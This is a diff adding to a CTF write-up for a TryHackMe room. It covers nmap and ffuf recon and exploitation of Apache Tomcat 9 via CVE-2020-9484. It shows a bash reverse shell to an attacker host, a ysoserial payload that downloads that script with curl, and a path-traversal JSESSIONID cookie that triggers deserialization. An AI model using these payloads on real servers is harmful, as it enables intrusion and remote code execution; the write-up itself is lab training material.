@@ -7,6 +7,10 @@ Access this hard-level CTF clicking <a href="https://tryhackme.com/room/certaind
 
 <br>
 
+<p = align="cernter"><code>nmap</code>  .  <code>gobuster</code>  .  </p>
+
+<br>
+
 
 <h2>Task 1 . Deploy the VM</h2>
 <p><code>Bob</code>´s finally joined the <code>CERT team</code> and has created a new front page. Surely nothing can go wrong.<br>
@@ -46,8 +50,8 @@ Access this hard-level CTF clicking <a href="https://tryhackme.com/room/certaind
 <p>
 
 - <code>&nbsp;&nbsp;22</code> &nbsp; : &nbsp; <code>ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code> &nbsp; : &nbsp; <code>OpenSSH 8.0</code><br>
-- <code>&nbsp;&nbsp;80</code> &nbsp; : &nbsp; <code>http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code> &nbsp; : &nbsp; <code>hastatic-1.0.0</code><br>
-- <code>8080</code>           &nbsp; : &nbsp; <code>http-proxy</code> &nbsp; :  &nbsp; <code>Apache Tomcat 97</code></p>
+- <code>&nbsp;&nbsp;80</code> &nbsp; : &nbsp; <code>http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code> &nbsp; : &nbsp; <code>hastatic-1.0.0</code> : <code>https://admin.certain-doom.thm</code><br>
+- <code>8080</code>           &nbsp; : &nbsp; <code>http-proxy</code> &nbsp; :  &nbsp; <code>Apache Tomcat 9</code></p>
 
 ```bash
 :~/CERTainDoom# nmap -sC -sV -Pn -n -p- -T4 xx.xxx.xxx.xxx
@@ -62,11 +66,11 @@ PORT     STATE  SERVICE    VERSION
 |     HTTP/1.0 200 OK
 |     Content-Length: 117674
 |     Accept-Ranges: bytes
-|     Date: Sun, 10 Aug 2025 12:57:17 GMT
+|     Date: Sun, 10 Aug 2025 xx:xx:xx GMT
 |     Server: hastatic-1.0.0
 |     Content-Type: text/html
 |     Cache-Control: no-transform,public,max-age=300,s-maxage=900
-|     Last-Modified: Thu, 26-Jan-2023 22:44:29 UTC
+|     Last-Modified: Thu, 26-Jan-2023 xx:xx:xx UTC
 |     ETag: 98eb1c6fb079742e0b8682cb642c5c777329ebbe
 |     Vary: Accept-Encoding
 |     Referrer-Policy: strict-origin-when-cross-origin
@@ -92,7 +96,7 @@ PORT     STATE  SERVICE    VERSION
 |     Content-Type: text/html;charset=utf-8
 |     Content-Language: en
 |     Content-Length: 431
-|     Date: Sun, 10 Aug 2025 12:57:17 GMT
+|     Date: Sun, 10 Aug 2025 xx:xx:xx GMT
 |     Connection: close
 |     Server: Apache Tomcat 9?
 |     <!doctype html><html lang="en"><head><title>HTTP Status 404 
@@ -114,23 +118,137 @@ PORT     STATE  SERVICE    VERSION
 9090/tcp closed zeus-admin
 ```
 
+<br>
+
+<h2>Web 80</h2>
+
+<p>
+
+- <code>https://admin.certain-doom.thm</code><br>
+- <code>url=https://youtu.be/dQw4w9WgXcQ"</code></p>
+
+<img width="1115" height="533" alt="image" src="https://github.com/user-attachments/assets/000df80a-1016-48a1-abe0-ef2e4123cf61" />
+
+<img width="1108" height="673" alt="image" src="https://github.com/user-attachments/assets/b545411a-8e2c-4399-b7b7-0818b9d17660" />
+
+<br>
+
+<p>
+
+- was redirected to YouTube</p>
+
+<img width="773" height="92" alt="image" src="https://github.com/user-attachments/assets/7642d128-1d9b-44cd-a56c-93dd58a1803a" />
+
+<br>
+<h2>Web 8080</h2>
+
+<img width="1126" height="47" alt="image" src="https://github.com/user-attachments/assets/ee378940-4a9b-478f-80e8-6b61c10e5791" />
+
+
+<br>
+<h2>ffuf</h2>
+
 
 ```bash
+:~/CERTainDoom# ffuf -u http://xx.xxx.xxx.xxx:8080/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -mc all -t 100 -ic -fc 404
+...
+reports                 [Status: 302, Size: 0, Words: 1, Lines: 1]
+http%3A%2F%2Fwww        [Status: 400, Size: 435, Words: 32, Lines: 1]
+http%3A%2F%2Fyoutube    [Status: 400, Size: 435, Words: 32, Lines: 1]
+http%3A%2F%2Fblog       [Status: 400, Size: 435, Words: 32, Lines: 1]
+http%3A%2F%2Fblogs      [Status: 400, Size: 435, Words: 32, Lines: 1]
+**http%3A%2F%2Fwww      [Status: 400, Size: 435, Words: 32, Lines: 1]
+```
 
+<br>
+<h2>Web 8080/reports</h2>
+
+<img width="1125" height="669" alt="image" src="https://github.com/user-attachments/assets/17f8ce23-5b8f-444c-8b23-ceaf35f26622" />
+
+<br>
+
+<img width="1111" height="134" alt="image" src="https://github.com/user-attachments/assets/603d6a03-160b-44c5-ab28-529266a19350" />
+
+<br>
+
+<h2>Tomcat 9 : Remote Code Execution Exploit</code></h2>
+
+<p>
+
+- <code>https://nvd.nist.gov/vuln/detail/cve-2020-9484</code><br>
+- <code>https://github.com/PenTestical/CVE-2020-9484</code></p>
+
+<img width="1875" height="833" alt="image" src="https://github.com/user-attachments/assets/6f5841f9-6eb2-4a35-bf07-e45af8d3df92" />
+
+<br>
+
+<img width="1821" height="872" alt="image" src="https://github.com/user-attachments/assets/335a63a5-ff4c-4a6c-b74b-7a63bf3fe440" />
+
+<br>
+<br>ysoserial
+
+
+```bash
+:~/CERTainDoom# cd /opt && git clone https://github.com/frohoff/ysoserial
 ```
 
 ```bash
-
+:/opt/ysoserial# cd /opt && git clone https://github.com/PenTestical/CVE-2020-9484 && cd CVE-2020-9484/ && chmod +x CVE-2020-9484.sh
 ```
 
 ```bash
+/opt/CVE-2020-9484# ./CVE-2020-9484.sh --help
 
+usage: ./CVE-2020-9484.sh target-ip
+
+Please start a web listener in /tmp folder:
+python3 -m http.server 80
+
+and start your netcat listener at port 4444:
+nc -nvlp 4444
 ```
+
+<br>
+<h2>rev.sh</h2>
 
 ```bash
-
+:/opt/CVE-2020-9484# cat rev.sh
+/bin/bash -i >& /dev/tcp/xx.xxx.xx.xx/443 0>&1
 ```
+
+
+<h2>Burp Suite and FoxyProxy<br>
+<p>
+
+- launched <code>Burp Suite</code><br>
+- enabled <code>FoxyProxy</code></p>
 
 ```bash
-
+/opt/CVE-2020-9484/ysoserial/target# java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 'curl xx.xxx.xxx.xxx -o /tmp/rev.sh' > payload.session
 ```
+
+<img width="1098" height="87" alt="image" src="https://github.com/user-attachments/assets/009b12ae-bbc6-4a3b-a140-3c47a0b6bfc7" />
+
+<br>
+
+<p>
+
+- <code>/usr/local/tomcat/temp/uploads/payload.session</code></p>
+
+<img width="1128" height="79" alt="image" src="https://github.com/user-attachments/assets/6f184779-6b6b-458a-83d9-47a3c2face6e" />
+
+
+<br>
+
+<p>
+
+- Cookie : JSESSIONID = F2565013911053060744B8011C1E1DD4<br></p>
+
+```bash
+Cookie: JSESSIONID=../../../../../../../../usr/local/tomcat/temp/uploads/payload.session
+```
+<br>
+
+<img width="1134" height="429" alt="image" src="https://github.com/user-attachments/assets/dd7c608f-4ad6-4f0f-b69c-981da39a2e0b" />
+
+
